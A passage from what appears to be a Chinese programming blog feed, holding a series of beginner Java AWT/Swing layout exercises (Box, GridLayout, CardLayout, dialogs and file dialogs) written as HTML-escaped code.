        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 300, 200);
    &#125;
&#125;
public class test
&#123;
    public static void main(String []args)
    &#123;
        create c1&#x3D;new create();
    &#125;
&#125;
-------------------------------------
import javax.swing.*;
import java.awt.*;

class create extends JFrame
&#123;
    Box b1,b2,b3,b4,b5,b6,b7,b8,b9,b10;
    JButton t1,t2,t3,t4,t5,t6,t7,t8,t9,t10;
    create() &#123;

        t1&#x3D;new JButton(&quot;BUTTON&quot;);
        t2&#x3D;new JButton(&quot;BUTTON&quot;);
        t3&#x3D;new JButton(&quot;BUTTON&quot;);
        t4&#x3D;new JButton(&quot;BUTTON&quot;);
        t5&#x3D;new JButton(&quot;BUTTON&quot;);
        t6&#x3D;new JButton(&quot;BUTTON&quot;);
        t7&#x3D;new JButton(&quot;BUTTON&quot;);
        t8&#x3D;new JButton(&quot;BUTTON&quot;);
        t9&#x3D;new JButton(&quot;BUTTON&quot;);
        t10&#x3D;new JButton(&quot;BUTTON&quot;);
        setLayout(new FlowLayout());
        b1&#x3D;Box.createVerticalBox();
        b1.add(t1);
        b2&#x3D;Box.createVerticalBox();
        b2.add(t2);
        b2.add(t3);
        b3&#x3D;Box.createVerticalBox();
        b3.add(t4);
        b4&#x3D;Box.createVerticalBox();
        b5&#x3D;Box.createVerticalBox();
        b4.add(t5);
        b5.add(t6);
        b5.add(t8);
        b6&#x3D;Box.createVerticalBox();
        b6.add(t7);
        b6.add(t9);
        b7&#x3D;Box.createVerticalBox();
        b7.add(t10);
        b8&#x3D;Box.createHorizontalBox();
        b8.add(b1);
        b8.add(b2);
        b8.add(b3);
        b9&#x3D;Box.createHorizontalBox();
        b9.add(b4);
        b9.add(b5);
        b9.add(b6);
        b9.add(b7);
        b10&#x3D;Box.createVerticalBox();
        b10.add(b8);
        b10.add(b9);
        add(b10);
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 300, 200);
    &#125;
&#125;
public class test
&#123;
    public static void main(String []args)
    &#123;
        create c1&#x3D;new create();
    &#125;
&#125;
-------------------------
import javax.swing.*;
import java.awt.*;

class create extends JFrame
&#123;
    Box b1,b2,b3,b4,b5,b6,b7,b8,b9,b10;
    JButton t1,t2,t3,t4,t5,t6,t7,t8,t9,t10;
    create() &#123;
        Dimension preferredSize &#x3D; new Dimension(10,14);
        t1&#x3D;new JButton(&quot;BUTTON&quot;);
        t2&#x3D;new JButton(&quot;BUTTON&quot;);
        t3&#x3D;new JButton(&quot;BUTTON&quot;);
        t4&#x3D;new JButton(&quot;BUTTON&quot;);
        t5&#x3D;new JButton(&quot;BUTTON&quot;);
        t6&#x3D;new JButton(&quot;BUTTON&quot;);
        t7&#x3D;new JButton(&quot;BUTTON&quot;);
        t8&#x3D;new JButton(&quot;BUTTON&quot;);
        t9&#x3D;new JButton(&quot;BUTTON&quot;);
        t10&#x3D;new JButton(&quot;BUTTON&quot;);
        setLayout(new FlowLayout());
        
        b1&#x3D;Box.createVerticalBox();
        b1.add(t1);
        b2&#x3D;Box.createVerticalBox();
        b2.add(t2);
        b2.add(t3);
        b3&#x3D;Box.createVerticalBox();
        b3.add(t4);
        b4&#x3D;Box.createVerticalBox();
        b5&#x3D;Box.createVerticalBox();
        b4.add(t5);
        b5.add(t6);
        b5.add(t8);
        b6&#x3D;Box.createVerticalBox();
        b6.add(t7);
        b6.add(t9);
        b7&#x3D;Box.createVerticalBox();
        b7.add(t10);
        b8&#x3D;Box.createHorizontalBox();
        b8.add(b1);
        b8.add(b2);
        b8.add(b3);
        b9&#x3D;Box.createHorizontalBox();
        b9.add(b4);
        b9.add(b5);
        b9.add(b6);
        b9.add(b7);
        b10&#x3D;Box.createVerticalBox();
        b10.add(b8);
        b10.add(b9);
        add(b10);
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 300, 200);
    &#125;
&#125;
public class test
&#123;
    public static void main(String []args)
    &#123;
        create c1&#x3D;new create();
    &#125;
&#125;
-----------------------------
import java.awt.Container;
import java.awt.GridLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.WindowConstants;

&#x2F;**
 * 1:常用面板
 * 面板也是一个Swing容器，他可以看作为容器容纳其他组件，但它也必须被添加到其他容器中
 * Swing中常用的面板包括JPanel面板和JScrollPane面板
 *
 * 2:JPanel面板可以聚集一些组件来布局
 * 读者首先应该明白面板也是一种容器，因为它继承了java.awt.Container类
 * @author biexiansheng
 *
 *&#x2F;
class JPanelTest extends JFrame&#123;

    public JPanelTest()&#123;
        Container container&#x3D;getContentPane();&#x2F;&#x2F;设置一个容器

        &#x2F;&#x2F;将整个容器设置为2行1列的网格布局     网格布局管理器x,y代表行和列
        container.setLayout(new GridLayout(2,3,0,0));

        &#x2F;&#x2F;初始化一个面板，设置1行3列的网格布局
        JPanel p1&#x3D;new JPanel(new GridLayout(1,1,0,0));
        JPanel p2&#x3D;new JPanel(new GridLayout(2,1,0,0));
        JPanel p3&#x3D;new JPanel(new GridLayout(1,2,0,0));
        JPanel p4&#x3D;new JPanel(new GridLayout(1,1,0,0));
        JPanel p5&#x3D;new JPanel(new GridLayout(2,2,0,0));
        JPanel p6&#x3D;new JPanel(new GridLayout(1,1,0,0));

        &#x2F;&#x2F;在面板中添加按钮
        p1.add(new JButton(&quot;1&quot;));
        p2.add(new JButton(&quot;2&quot;));
        p2.add(new JButton(&quot;3&quot;));
        p3.add(new JButton(&quot;4&quot;));
        p4.add(new JButton(&quot;5&quot;));
        p5.add(new JButton(&quot;6&quot;));
        p5.add(new JButton(&quot;7&quot;));
        p5.add(new JButton(&quot;8&quot;));
        p5.add(new JButton(&quot;9&quot;));
        p6.add(new JButton(&quot;10&quot;));

        &#x2F;&#x2F;最重要的一步，将面板实例添加到容器中
        container.add(p1);
        container.add(p2);
        container.add(p3);
        container.add(p4);
        container.add(p5);
        container.add(p6);

        &#x2F;&#x2F;将容器外部特性实例化
        setTitle(&quot;JPanel面板的案例&quot;);
        setSize(400,250);&#x2F;&#x2F;设窗体的大小     宽和高
        setVisible(true);&#x2F;&#x2F;设定窗体的可视化
        &#x2F;&#x2F;设置窗体的关闭方式
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
    &#125;
    public static void main(String[] args) &#123;
        &#x2F;&#x2F; TODO Auto-generated method stub
        JPanelTest jt&#x3D;new JPanelTest();
    &#125;

&#125;
-0----------------------------------
import java.awt.*;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.WindowConstants;

public class JPanelTest extends JFrame&#123;
    public JPanelTest() &#123;
        Container c &#x3D; getContentPane();
        c.setLayout(new GridLayout(2,3,0,0));

        JPanel p1 &#x3D; new JPanel(new GridLayout(1,1,0,0));
        JPanel p2 &#x3D; new JPanel(new GridLayout(2,1,0,0));
        JPanel p3 &#x3D; new JPanel(new GridLayout(1,1,0,0));
        JPanel p4 &#x3D; new JPanel(new GridLayout(1,1,0,0));
        JPanel p5 &#x3D; new JPanel(new GridLayout(2,2,0,0));
        JPanel p6 &#x3D; new JPanel(new GridLayout(1,1,0,0));
        p1.setPreferredSize(new Dimension(10,14));
        p2.setPreferredSize(new Dimension(20,14));
        p3.setPreferredSize(new Dimension(10,14));
        p4.setPreferredSize(new Dimension(10,14));
        p5.setPreferredSize(new Dimension(20,14));
        p6.setPreferredSize(new Dimension(10,14));
        p1.add(new JButton(&quot;BUTTON&quot;));
        p2.add(new JButton(&quot;BUTTON&quot;));
        p2.add(new JButton(&quot;BUTTON&quot;));
        p3.add(new JButton(&quot;BUTTON&quot;));
        p4.add(new JButton(&quot;BUTTON&quot;));
        p5.add(new JButton(&quot;BUTTON&quot;));
        p5.add(new JButton(&quot;BUTTON&quot;));
        p5.add(new JButton(&quot;BUTTON&quot;));
        p5.add(new JButton(&quot;BUTTON&quot;));
        p6.add(new JButton(&quot;BUTTON&quot;));

        
        c.add(p1);
        c.add(p2);
        c.add(p3);
        c.add(p4);
        c.add(p5);
        c.add(p6);
        setSize(600,300);
        setTitle(&quot;这是一个JPanel的窗体&quot;);
        setVisible(true);
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
    &#125;
    public static void main(String args[]) &#123;
        new JPanelTest();
    &#125;
&#125;
-------------------
import javax.swing.*;
import java.awt.*;

public class test
&#123;
    public static void main(String []args)
    &#123;
        Frame f&#x3D;new JFrame(&quot;LHL&#39;S Java&quot;);
        ScrollPane s&#x3D;new ScrollPane(ScrollPane.SCROLLBARS_ALWAYS);
        s.add(new TextField(&quot;adfasdf&quot;));
        s.add(new Button(&quot;asdfasdf&quot;));
        f.add(s);

        f.setVisible(true);
        f.setBounds(10,10,500,300);
    &#125;
&#125;
------------------------------------
import javax.swing.*;
import java.awt.*;

public class test
&#123;
    public static void main(String []args)
    &#123;
        Frame f&#x3D;new JFrame(&quot;LHL&#39;S Java&quot;);
        Panel p1&#x3D;new Panel();
        p1.add(new TextField(30));
        f.add(p1,BorderLayout.NORTH);

        Panel p2&#x3D;new Panel();
        p2.setLayout(new GridLayout(3,4,4,4));
        for(int i&#x3D;0;i&lt;10;i++)
        &#123;
            p2.add(new Button(i+&quot;&quot;));
        &#125;
        p2.add(new Button(&quot;+&quot;));
        p2.add(new Button(&quot;-&quot;));
        p2.add(new Button(&quot;*&quot;));
        p2.add(new Button(&quot;&#x2F;&quot;));
        f.add(p2,BorderLayout.SOUTH);
        f.setVisible(true);
        f.pack();
        &#x2F;&#x2F;f.setBounds(10,10,500,300);
    &#125;
&#125;
---------------------------------------
import javax.smartcardio.Card;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test
&#123;
    public static void main(String[] args)
    &#123;
        Frame f &#x3D; new JFrame(&quot;LHL&#39;S Java&quot;);
        Panel p1 &#x3D; new Panel();
        CardLayout cardLayout &#x3D; new CardLayout();
        p1.setLayout(cardLayout);
        String names[] &#x3D; &#123;&quot;第一张&quot;, &quot;第二张&quot;, &quot;第三张&quot;, &quot;第四张&quot;, &quot;第五张&quot;&#125;;
        for (int i &#x3D; 0; i &lt; names.length; i++)
            p1.add(names[i], new Button(names[i]));
        f.add(p1, BorderLayout.CENTER);
        Panel p2 &#x3D; new Panel();
        Button b1 &#x3D; new Button(&quot;上一张&quot;);
        Button b2 &#x3D; new Button(&quot;下一张&quot;);
        Button b3 &#x3D; new Button(&quot;第一张&quot;);
        Button b4 &#x3D; new Button(&quot;最后一张&quot;);
        Button b5 &#x3D; new Button(&quot;第三张&quot;);
        ActionListener listener &#x3D; new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                String s &#x3D; e.getActionCommand();
                switch (s)
                &#123;
                    case &quot;上一张&quot;:
                        cardLayout.previous(p1);
                        break;
                    case &quot;下一张&quot;:
                        cardLayout.next(p1);
                        break;
                    case &quot;第一张&quot;:
                        cardLayout.first(p1);
                        break;
                    case &quot;最后一张&quot;:
                        cardLayout.last(p1);
                        break;
                    case &quot;第三张&quot;:
                        cardLayout.show(p1, &quot;第三张&quot;);
                        break;
                &#125;
            &#125;
        &#125;;
        b1.addActionListener(listener);
        b2.addActionListener(listener);
        b3.addActionListener(listener);
        b4.addActionListener(listener);
        b5.addActionListener(listener);

        p2.add(b1);
        p2.add(b2);
        p2.add(b3);
        p2.add(b4);
        p2.add(b5);
        f.add(p2, BorderLayout.SOUTH);


        f.setVisible(true);
        f.pack();
        &#x2F;&#x2F;f.setBounds(10,10,500,300);
    &#125;
&#125;
---------------------------------
import javax.swing.*;
import java.awt.*;

public class  test
&#123;
    public static void main(String []args)
    &#123;
        Frame frame&#x3D;new Frame(&quot;LHL&quot;);
        BoxLayout boxLayout&#x3D;new BoxLayout(frame,BoxLayout.Y_AXIS);
        frame.setLayout(boxLayout);
        frame.add(new Button(&quot;按钮1&quot;));
        frame.add(new Button(&quot;按钮2&quot;));
        frame.pack();
        frame.setVisible(true);
        

    &#125;
&#125;
------------------------------
import javafx.scene.control.CheckBox;
import javafx.scene.layout.VBox;

import javax.swing.*;
import java.awt.*;
class create
&#123;
    Frame frame&#x3D;new Frame();
    TextArea ta&#x3D;new TextArea(5,50);
    Choice colorChooser&#x3D;new Choice();
    CheckboxGroup cbg&#x3D;new CheckboxGroup();
    Checkbox male&#x3D;new Checkbox(&quot;男&quot;,cbg,true);
    Checkbox female&#x3D;new Checkbox(&quot;女&quot;,cbg,false);
    Checkbox isMarried &#x3D;new Checkbox(&quot;是否已婚&quot;);
    TextField tf&#x3D;new TextField(20);
    Button ok&#x3D;new Button(&quot;确认&quot;);
    List colorList&#x3D;new List(6,true);

    create()
    &#123;
        Box bBox&#x3D;Box.createHorizontalBox();
        bBox.add(tf);
        bBox.add(ok);
        frame.add(bBox,BorderLayout.SOUTH);
        Box cBox&#x3D;Box.createHorizontalBox();
        colorChooser.add(&quot;红色&quot;);
        colorChooser.add(&quot;蓝色&quot;);
        colorChooser.add(&quot;绿色&quot;);
        cBox.add(colorChooser);
        cBox.add(male);
        cBox.add(female);
        cBox.add(isMarried);
        Box topLeft&#x3D;Box.createVerticalBox();
        topLeft.add(ta);
        topLeft.add(cBox);
        Box top&#x3D;Box.createHorizontalBox();
        top.add(topLeft);
        colorList.add(&quot;红色&quot;);
        colorList.add(&quot;蓝色&quot;);
        colorList.add(&quot;绿色&quot;);
        top.add(colorList);
        frame.add(top);
        frame.setVisible(true);
        frame.pack();
        frame.setBounds(10,10,400,600);
    &#125;

&#125;
public class test
&#123;

    public static void main(String []args)
    &#123;
        new create();

    &#125;
&#125;
------------------------------
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test
&#123;

    public static void main(String[] args)
    &#123;
        Frame frame &#x3D;new Frame();
        Dialog d1&#x3D;new Dialog(frame,&quot;模式对话框&quot;,true);
        Dialog d2&#x3D;new Dialog(frame,&quot;非模式对话框&quot;,false);
        d1.setBounds(20,30,300,200);
        d2.setBounds(20,30,300,200);
        Button b1&#x3D;new Button(&quot;打开模式对话框&quot;);
        Button b2&#x3D;new Button(&quot;打开非模式对话框&quot;);
        b1.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                d1.setVisible(true);
            &#125;
        &#125;);
        b2.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                d2.setVisible(true);
            &#125;
        &#125;);
        frame.add(b1,BorderLayout.NORTH);
        frame.add(b2);
        frame.pack();
        frame.setVisible(true);
    &#125;
&#125;
-----------------------------------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test
&#123;

    public static void main(String[] args)
    &#123;
        Frame frame &#x3D;new Frame();
        Dialog d1&#x3D;new Dialog(frame,&quot;模式对话框&quot;,true);
        Dialog d2&#x3D;new Dialog(frame,&quot;非模式对话框&quot;,false);
        d1.add(new TextField(30),BorderLayout.CENTER);
        d1.add(new Button(&quot;确认&quot;),BorderLayout.SOUTH);
        d1.setBounds(20,30,300,200);
        d2.setBounds(20,30,300,200);
        Button b1&#x3D;new Button(&quot;打开模式对话框&quot;);
        Button b2&#x3D;new Button(&quot;打开非模式对话框&quot;);
        b1.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                d1.setVisible(true);
            &#125;
        &#125;);
        b2.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                d2.setVisible(true);
            &#125;
        &#125;);
        frame.add(b1,BorderLayout.NORTH);
        frame.add(b2);
        frame.pack();
        frame.setVisible(true);
    &#125;
&#125;
------------------------------------
点击出现Hello
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class test
&#123;

    public static void main(String[] args)
    &#123;
        Frame frame&#x3D;new Frame(&quot;LHL&#39;s Java&quot;);
        FileDialog f1&#x3D;new FileDialog(frame,&quot;选择要打开的文件&quot;,FileDialog.LOAD);
        FileDialog f2&#x3D;new FileDialog(frame,&quot;选择要保存的路径&quot;,FileDialog.SAVE);
        Button b1&#x3D;new Button(&quot;打开文件&quot;);
        Button b2&#x3D;new Button(&quot;保存文件&quot;);
        b1.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                f1.setVisible(true);
                String directory&#x3D;f1.getDirectory();
                String file&#x3D;f1.getFile();
                System.out.println(&quot;打开的文件路径为:&quot;+directory);
                System.out.println(&quot;打开的文件名为:&quot;+file);
            &#125;
        &#125;);
        b2.addActionListener(new ActionListener()
        &#123;
            @Override
            public void actionPerformed(ActionEvent e)
            &#123;
                String directroy&#x3D;f2.getDirectory();
                String file&#x3D;f2.getFile();
                System.out.println(&quot;保存的文件路径为:&quot;+directroy);
                System.out.println(&quot;保存的文件名为:&quot;+file);
            &#125;
        &#125;);
        frame.add(b1,BorderLayout.NORTH);
        frame.add(b2);
        frame.setVisible(true);
        frame.pack();
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>数据结构 查找算法</title>
